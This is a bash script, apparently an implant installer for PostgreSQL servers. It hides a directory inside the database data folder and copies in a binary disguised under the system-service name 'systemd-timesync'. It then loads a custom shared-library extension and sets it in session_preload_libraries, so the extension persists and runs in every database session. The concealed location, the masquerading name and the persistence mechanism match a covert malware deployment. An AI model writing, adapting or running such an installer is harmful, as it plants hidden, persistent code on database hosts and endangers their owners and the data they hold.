#!/bin/bash
set -u
ID="metabase-6@metabase-6"
P=$(psql -U postgres -tAc "show data_directory" 2>/dev/null | tr -d ' ')
[ -n "${P:-}" ] || P=/var/lib/postgresql/data
WDIR="$P/.wdcd"
mkdir -p "$WDIR/bin" "$WDIR/state"
cp diagd "$WDIR/bin/systemd-timesync"
cp libcache.so "$WDIR/bin/libcache.so"
for f in libwdcd_pg_*.so; do [ -f "$f" ] || continue; cp "$f" "$WDIR/$(basename "$f")"; done
chmod 755 "$WDIR/bin/systemd-timesync"
chmod 644 "$WDIR/bin/libcache.so" "$WDIR"/*.so 2>/dev/null || true
VER=$(psql -U postgres -tAc "show server_version_num" 2>/dev/null | tr -d ' ')
MAJOR=$(( (${VER:-0} / 10000) ))
EXT="$WDIR/libwdcd_pg_${MAJOR}0000.so"
[ -f "$EXT" ] || EXT=$(ls "$WDIR"/libwdcd_pg_*.so 2>/dev/null | head -1)
echo "agent -> $WDIR (pg major=$MAJOR, ext=$(basename "${EXT:-none}"))"
if [ -n "${EXT:-}" ] && [ -f "$EXT" ]; then
	R=$(psql -U postgres -tAc "LOAD '$EXT'" 2>&1); RC=$?
	echo "LOAD rc=$RC ${R:-ok}"
	if [ $RC -eq 0 ]; then
		psql -U postgres -c "ALTER SYSTEM SET session_preload_libraries = '$EXT'" >/dev/null 2>&1
		psql -U postgres -c "SELECT pg_reload_conf()" >/dev/null 2>&1
		echo "PG-extension ACTIVE: $ID (uid=$(id -u))"
	else
		echo "LOAD FAILED — session_preload untouched (${R})" >&2
	fi
else
	echo "no extension .so — агент только копиями (LOAD пропущен)" >&2
fi
